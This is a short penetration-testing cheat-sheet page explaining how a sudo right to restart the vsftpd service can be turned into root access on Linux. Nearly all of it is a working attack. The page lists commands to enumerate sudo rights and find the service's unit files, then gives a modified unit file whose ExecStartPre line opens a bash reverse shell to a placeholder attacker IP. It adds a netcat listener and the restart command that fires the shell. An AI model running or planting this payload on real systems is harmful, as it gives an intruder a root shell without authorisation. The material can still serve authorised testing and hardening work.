# Sudo Service Privilege Escalation

The `service` command might be vulnerable to privilege escalation if we can execute as root.

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
sudo -l

(ALL : ALL) /usr/sbin/service vsftpd restart
```

If we can execute **service** command as root, we may be able to escalate to root privilege.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Find the Location of the Config File <a href="#id-1-find-the-location-of-the-config-file" id="id-1-find-the-location-of-the-config-file"></a>

Assume we can operate the **vsftpd** service as root. Firse off, find the service config file for vsftpd.

```shellscript
find / -name "*vsftpd*"
```

For instance, we'll find the location as below.

```
/lib/systemd/system/vsftpd.service
/etc/systemd/system/multi-user.target.wants/vsftpd.service
```

When getting the locations, the next thing to do is to check the permission. If we have a write permission for the above each files, we can update the execution when vsftpd started.

#### 2. Update the Config File <a href="#id-2-update-the-config-file" id="id-2-update-the-config-file"></a>

Insert the payload for reverse shell to the value of the **“ExecStartPre”**. Doing this, we can get a shell from our listener when the FTP daemon restarted.

```shellscript
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

Then we need to reload the daemon.

```
systemctl daemon-reload
```

#### 3. Execution <a href="#id-3-execution" id="id-3-execution"></a>

In local machine, start listener for getting a shell.

```
nc -lvnp 4444
```

Now execute the command which can be executed with sudo.

```
sudo /usr/sbin/service vsftpd restart
```

We should get a shell as root user.
